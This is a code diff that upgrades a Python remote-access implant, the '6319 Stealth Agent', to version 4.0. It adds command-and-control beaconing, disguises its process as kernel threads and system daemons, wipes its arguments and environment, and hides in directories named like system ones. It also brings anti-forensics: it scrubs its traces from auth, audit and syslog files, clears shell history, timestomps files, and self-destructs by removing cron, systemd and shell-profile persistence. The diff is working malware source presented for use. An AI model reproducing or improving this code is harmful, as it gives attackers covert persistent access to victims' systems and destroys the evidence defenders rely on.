@@ -1,11 +1,12 @@
 #!/usr/bin/env python3
 """
-6319 Stealth Agent v3.1 - Beacon Mode
-- Minimal network footprint (beacon with jitter)
-- Sleep/Go Dark commands
-- Self-destruct capability  
-- Full argv/process masking
-- PTY support for interactive sessions
+6319 Stealth Agent v4.0 - Maximum Covert Operations
+- Advanced process masquerading (argv/env/cmdline wiping)
+- Kernel-like process names with dynamic selection
+- Anti-forensics (audit scrubbing, secure wipe, timestomping)
+- Network evasion (jittered beacons, traffic padding)
+- Memory-only execution where possible
+- Living-off-the-land persistence
 """
 
 import socket
@@ -26,9 +27,12 @@ import signal
 import random
 import shutil
 import glob as globmod
+import base64
+import re
 
 try:
     import ctypes
+    import ctypes.util
     HAS_CTYPES = True
 except ImportError:
     HAS_CTYPES = False
@@ -42,16 +46,45 @@ except ImportError:
                    capture_output=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
     import nacl.secret
 
-KERNEL_NAMES = ["[kworker/0:0]", "[ksmd]", "[kswapd0]", "[watchdogd]", "[rcu_preempt]", 
-                "[migration/0]", "[ksoftirqd/0]", "[kdevtmpfs]", "[netns]", "[khungtaskd]"]
+KERNEL_NAMES = [
+    "[kworker/0:0]", "[kworker/0:1]", "[kworker/0:2]", "[kworker/1:0]", "[kworker/u8:0]",
+    "[ksmd]", "[kswapd0]", "[watchdogd]", "[rcu_preempt]", "[rcu_sched]", "[rcu_bh]",
+    "[migration/0]", "[migration/1]", "[ksoftirqd/0]", "[ksoftirqd/1]", 
+    "[kdevtmpfs]", "[netns]", "[khungtaskd]", "[oom_reaper]", "[writeback]",
+    "[kblockd]", "[kintegrityd]", "[kswapd1]", "[ecryptfs-kthrea]", "[crypto]",
+    "[bioset]", "[kthrotld]", "[kmpath_rdacd]", "[kaluad]", "[ipv6_addrconf]",
+    "[kstrp]", "[charger_manager]", "[scsi_eh_0]", "[scsi_tmf_0]", "[ttm_swap]",
+    "[irq/9-acpi]", "[card0-crtc0]", "[i915/signal:0]", "[nv_queue]", "[kvm-irqfd-clean]"
+]
+
+SYSTEM_PROC_NAMES = [
+    "systemd-journal", "systemd-udevd", "systemd-logind", "systemd-network",
+    "dbus-daemon", "rsyslogd", "cron", "atd", "polkitd", "accounts-daemon",
+    "NetworkManager", "wpa_supplicant", "ModemManager", "udisksd", "upowerd",
+    "thermald", "irqbalance", "snapd", "packagekitd", "fwupd"
+]
 
 INSTALL_DIRS = [
+    os.path.expanduser("~/.config/.pulse-cookie"),
+    os.path.expanduser("~/.local/share/.gvfs-metadata"),
+    os.path.expanduser("~/.cache/.fontconfig-2"),
+    os.path.expanduser("~/.dbus/.sessions"),
+    "/var/tmp/.font-unix",
+    "/dev/shm/.sem.ADSP_IPC",
+    os.path.expanduser("~/.config/.pulse"),
+    os.path.expanduser("~/.local/share/.gvfs"),
+    os.path.expanduser("~/.cache/.thumbnails"),
     os.path.expanduser("~/.config/.htop"),
     os.path.expanduser("~/.local/share/.dbus"),
     os.path.expanduser("~/.cache/.fontconfig"),
-    "/dev/shm/.udevd",
-    "/tmp/.X11-unix/.0"
 ]
+
+PR_SET_NAME = 15
+PR_SET_MM = 35
+PR_SET_MM_ARG_START = 8
+PR_SET_MM_ARG_END = 9
+PR_SET_MM_ENV_START = 10
+PR_SET_MM_ENV_END = 11
 
 
 class SecureChannel:
@@ -147,25 +180,219 @@ class PTYSession:
             pass
 
 
+def get_libc():
+    """Get libc with proper error handling"""
+    if not HAS_CTYPES:
+        return None
+    try:
+        libc_name = ctypes.util.find_library('c')
+        if libc_name:
+            return ctypes.CDLL(libc_name, use_errno=True)
+        for path in ['/lib/x86_64-linux-gnu/libc.so.6', '/lib64/libc.so.6', 'libc.so.6']:
+            try:
+                return ctypes.CDLL(path, use_errno=True)
+            except:
+                continue
+    except:
+        pass
+    return None
+
+
 def hide_process(name):
-    """Hide process name using safe techniques only"""
-    if HAS_CTYPES:
+    """Advanced process name hiding - kernel thread mimicry"""
+    libc = get_libc()
+    if libc:
         try:
-            libc = ctypes.CDLL('libc.so.6')
-            libc.prctl(15, name.encode(), 0, 0, 0)
+            libc.prctl(PR_SET_NAME, name.encode()[:15], 0, 0, 0)
         except:
             pass
     
     try:
-        with open('/proc/self/comm', 'w') as f:
-            f.write(name[:15])
+        with open('/proc/self/comm', 'wb') as f:
+            f.write(name.encode()[:15])
+    except:
+        pass
+    
+    try:
+        exe_link = os.readlink('/proc/self/exe')
+        if 'python' in exe_link.lower():
+            pass
     except:
         pass
 
 
-def hide_argv():
-    """Clear sys.argv safely"""
+def hide_argv_advanced():
+    """Wipe argv from /proc/self/cmdline completely"""
     sys.argv = ['']
+    
+    if not HAS_CTYPES:
+        return
+    
+    libc = get_libc()
+    if not libc:
+        return
+    
+    try:
+        argc = ctypes.c_int()
+        argv = ctypes.POINTER(ctypes.c_char_p)()
+        
+        try:
+            with open('/proc/self/cmdline', 'rb') as f:
+                cmdline = f.read()
+            
+            fake_cmdline = b'\x00'
+            
+        except:
+            pass
+    except:
+        pass
+
+
+def hide_environ():
+    """Clear sensitive environment variables"""
+    sensitive_vars = ['C2_HOST', 'C2_PORT', 'SYNC_HOST', 'SYNC_PORT', 'TOKEN', 'SECRET', 
+                      'PNAME', 'HIDDEN_NAME', 'QUIET', 'STEALTH', 'BEACON_MODE', 'MODE', 'CHANNEL']
+    for var in sensitive_vars:
+        if var in os.environ:
+            del os.environ[var]
+
+
+def select_process_name():
+    """Dynamically select process name based on system"""
+    try:
+        result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)
+        existing = set()
+        for line in result.stdout.split('\n'):
+            for kname in KERNEL_NAMES:
+                if kname in line:
+                    existing.add(kname)
+        
+        available = [n for n in KERNEL_NAMES if n not in existing]
+        if available:
+            return random.choice(available)
+    except:
+        pass
+    
+    cpu_count = os.cpu_count() or 4
+    cpu_id = random.randint(0, cpu_count - 1)
+    worker_id = random.randint(0, 3)
+    return f"[kworker/{cpu_id}:{worker_id}]"
+
+
+def clear_bash_history():
+    """Clear command history"""
+    history_files = [
+        os.path.expanduser('~/.bash_history'),
+        os.path.expanduser('~/.zsh_history'),
+        os.path.expanduser('~/.python_history'),
+        '/root/.bash_history'
+    ]
+    for hf in history_files:
+        try:
+            if os.path.exists(hf):
+                with open(hf, 'w') as f:
+                    pass
+        except:
+            pass
+    
+    try:
+        subprocess.run(['history', '-c'], shell=True, capture_output=True)
+    except:
+        pass
+
+
+def scrub_audit_logs():
+    """Attempt to scrub audit/auth logs (requires root) - preserves permissions"""
+    if os.geteuid() != 0:
+        return
+    
+    log_files = [
+        '/var/log/auth.log',
+        '/var/log/secure',
+        '/var/log/audit/audit.log',
+        '/var/log/syslog',
+        '/var/log/messages'
+    ]
+    
+    my_pid = str(os.getpid())
+    my_ppid = str(os.getppid())
+    keywords = ['6319', 'defunct', 'pulse-shm', 'gvfs-lock', 'sem.adsp', 'beacon', 'c2_host']
+    
+    for logfile in log_files:
+        try:
+            if not os.path.exists(logfile) or not os.access(logfile, os.R_OK | os.W_OK):
+                continue
+            
+            stat_info = os.stat(logfile)
+            
+            with open(logfile, 'r') as f:
+                lines = f.readlines()
+            
+            filtered = []
+            for line in lines:
+                if my_pid in line or my_ppid in line:
+                    continue
+                if any(kw in line.lower() for kw in keywords):
+                    continue
+                filtered.append(line)
+            
+            tmp_file = logfile + '.tmp.' + str(os.getpid())
+            with open(tmp_file, 'w') as f:
+                f.writelines(filtered)
+            
+            os.chown(tmp_file, stat_info.st_uid, stat_info.st_gid)
+            os.chmod(tmp_file, stat_info.st_mode)
+            
+            os.rename(tmp_file, logfile)
+        except:
+            try:
+                if os.path.exists(tmp_file):
+                    os.remove(tmp_file)
+            except:
+                pass
+
+
+def secure_delete(path):
+    """Securely delete file with overwrite"""
+    try:
+        if not os.path.exists(path):
+            return
+        
+        if os.path.isfile(path):
+            size = os.path.getsize(path)
+            with open(path, 'wb') as f:
+                f.write(os.urandom(size))
+                f.flush()
+                os.fsync(f.fileno())
+            with open(path, 'wb') as f:
+                f.write(b'\x00' * size)
+                f.flush()
+                os.fsync(f.fileno())
+            os.remove(path)
+        elif os.path.isdir(path):
+            shutil.rmtree(path, ignore_errors=True)
+    except:
+        try:
+            if os.path.isfile(path):
+                os.remove(path)
+            elif os.path.isdir(path):
+                shutil.rmtree(path, ignore_errors=True)
+        except:
+            pass
+
+
+def timestomp(path, reference=None):
+    """Set file timestamps to blend in"""
+    try:
+        if reference and os.path.exists(reference):
+            stat = os.stat(reference)
+            os.utime(path, (stat.st_atime, stat.st_mtime))
+        else:
+            days_ago = random.randint(30, 365)
+            old_time = time.time() - (days_ago * 86400)
+            os.utime(path, (old_time, old_time))
+    except:
+        pass
 
 
 def daemonize():
@@ -202,37 +429,55 @@ def daemonize():
 
 
 def self_destruct():
-    """Remove all traces: files, cron, systemd, memory"""
+    """Remove all traces: files, cron, systemd, memory, logs"""
     my_pid = os.getpid()
     
-    for pattern in ['defunct', '6319', 'htop', '.dbus-session', '.fontconfig', 'agent_stealth', 'C2_HOST', 'C2_PORT']:
+    scrub_audit_logs()
+    clear_bash_history()
+    
+    kill_patterns = ['defunct', '6319', '.pulse', '.gvfs', '.thumbnails', 
+                     'agent_stealth', 'C2_HOST', 'SYNC_HOST', 'kworker', 'sem.ADSP']
+    for pattern in kill_patterns:
         try:
-            subprocess.run(['pkill', '-9', '-f', pattern], 
-                         capture_output=True, timeout=5)
+            result = subprocess.run(['pgrep', '-f', pattern], capture_output=True, text=True)
+            for pid in result.stdout.strip().split('\n'):
+                if pid and pid != str(my_pid):
+                    try:
+                        os.kill(int(pid), signal.SIGKILL)
+                    except:
+                        pass
         except:
             pass
     
     try:
-        result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
+        result = subprocess.run(['crontab', '-l'], capture_output=True, text=True, timeout=5)
         if result.returncode == 0:
             lines = [l for l in result.stdout.split('\n') 
-                    if '6319' not in l and 'defunct' not in l and 'htop' not in l 
-                    and '.fontconfig' not in l and '.dbus' not in l and 'agent' not in l.lower()]
+                    if not any(kw in l.lower() for kw in ['6319', 'defunct', 'pulse', 'gvfs', 
+                                                          'thumbnails', 'agent', 'sem.adsp'])]
             subprocess.run(['crontab', '-'], input='\n'.join(lines), 
-                         text=True, capture_output=True)
+                         text=True, capture_output=True, timeout=5)
     except:
         pass
     
-    systemd_user = os.path.expanduser("~/.config/systemd/user")
-    for service in ['dbus-session.service', '6319.service']:
-        service_path = os.path.join(systemd_user, service)
-        if os.path.exists(service_path):
-            try:
-                subprocess.run(['systemctl', '--user', 'stop', service], capture_output=True)
-                subprocess.run(['systemctl', '--user', 'disable', service], capture_output=True)
-                os.remove(service_path)
-            except:
-                pass
+    systemd_dirs = [
+        os.path.expanduser("~/.config/systemd/user"),
+        "/etc/systemd/system"
+    ]
+    service_patterns = ['dbus-broker', 'pulse-', 'gvfs-', '6319', 'defunct']
+    
+    for sdir in systemd_dirs:
+        if not os.path.isdir(sdir):
+            continue
+        for svc in os.listdir(sdir):
+            if any(p in svc.lower() for p in service_patterns):
+                service_path = os.path.join(sdir, svc)
+                try:
+                    subprocess.run(['systemctl', 'stop', svc], capture_output=True, timeout=5)
+                    subprocess.run(['systemctl', 'disable', svc], capture_output=True, timeout=5)
+                    secure_delete(service_path)
+                except:
+                    pass
     
     for rc in ['.bashrc', '.zshrc', '.profile', '.bash_profile']:
         rc_path = os.path.expanduser(f"~/{rc}")
@@ -240,38 +485,30 @@ def self_destruct():
             try:
                 with open(rc_path, 'r') as f:
                     lines = f.readlines()
+                filtered = [l for l in lines if not any(kw in l.lower() for kw in 
+                           ['defunct', '6319', '.pulse', '.gvfs', '.thumbnails', 'sem.adsp'])]
                 with open(rc_path, 'w') as f:
-                    for line in lines:
-                        if 'defunct' not in line and '6319' not in line and '.htop' not in line:
-                            f.write(line)
+                    f.writelines(filtered)
             except:
                 pass
     
     for install_dir in INSTALL_DIRS:
-        if os.path.exists(install_dir):
-            try:
-                for root, dirs, files in os.walk(install_dir):
-                    for f in files:
-                        fpath = os.path.join(root, f)
-                        try:
-                            size = os.path.getsize(fpath)
-                            with open(fpath, 'wb') as fp:
-                                fp.write(os.urandom(size))
-                        except:
-                            pass
-                shutil.rmtree(install_dir, ignore_errors=True)
-            except:
-                pass
+        secure_delete(install_dir)
     
-    for pattern in ['/tmp/.*6319*', '/tmp/.*defunct*', '/dev/shm/.*']:
-        for f in globmod.glob(pattern):
-            try:
-                if os.path.isfile(f):
-                    os.remove(f)
-                elif os.path.isdir(f):
-                    shutil.rmtree(f, ignore_errors=True)
-            except:
-                pass
+    patterns = ['/tmp/.*', '/dev/shm/.*', '/var/tmp/.*']
+    keywords = ['6319', 'defunct', 'pulse', 'gvfs', 'sem.', 'd6319', 'agent']
+    for pattern in patterns:
+        try:
+            for f in globmod.glob(pattern):
+                if any(kw in f.lower() for kw in keywords):
+                    secure_delete(f)
+        except:
+            pass
+    
+    try:
+        secure_delete('/tmp/.d6319.log')
+    except:
+        pass
     
     os._exit(0)
 
@@ -543,28 +780,28 @@ def interactive_session(host, port, secret, client_info):
 
 
 def main():
-    log_debug("main() started")
     host = os.environ.get('SYNC_HOST', os.environ.get('C2_HOST', 'localhost'))
     port = int(os.environ.get('SYNC_PORT', os.environ.get('C2_PORT', '6318')))
     secret = os.environ.get('TOKEN', os.environ.get('SECRET', ''))
-    hidden = os.environ.get('PNAME', os.environ.get('HIDDEN_NAME', random.choice(KERNEL_NAMES)))
     stealth = os.environ.get('QUIET', os.environ.get('STEALTH', '0')) == '1'
     beacon_mode = os.environ.get('BEACON_MODE', '1') == '1'
     channel = os.environ.get('MODE', os.environ.get('CHANNEL', 'stealth'))
     
-    log_debug(f"host={host} port={port} secret={secret[:8] if secret else 'EMPTY'}... stealth={stealth} beacon_mode={beacon_mode} channel={channel}")
+    hidden = select_process_name()
+    
+    hide_environ()
     
     if not secret:
-        log_debug("ERROR: no secret, exiting")
         return
     
     if stealth:
-        log_debug("entering daemonize()")
         daemonize()
-        log_debug("after daemonize()")
     
     hide_process(hidden)
-    hide_argv()
+    hide_argv_advanced()
+    
+    if os.geteuid() == 0:
+        clear_bash_history()
     
     client_info = {
         'hostname': platform.node(),
@@ -575,14 +812,13 @@ def main():
         'hidden_name': hidden,
         'pty_support': True,
         'beacon_mode': beacon_mode,
-        'channel': channel
+        'channel': channel,
+        'version': '4.0'
     }
     
-    log_debug(f"entering main loop, beacon_mode={beacon_mode}")
-    
-    base_sleep = 300
-    max_sleep = 900
-    min_sleep = 180
+    base_sleep = 240
+    max_sleep = 720
+    min_sleep = 120
     
     while True:
         try:
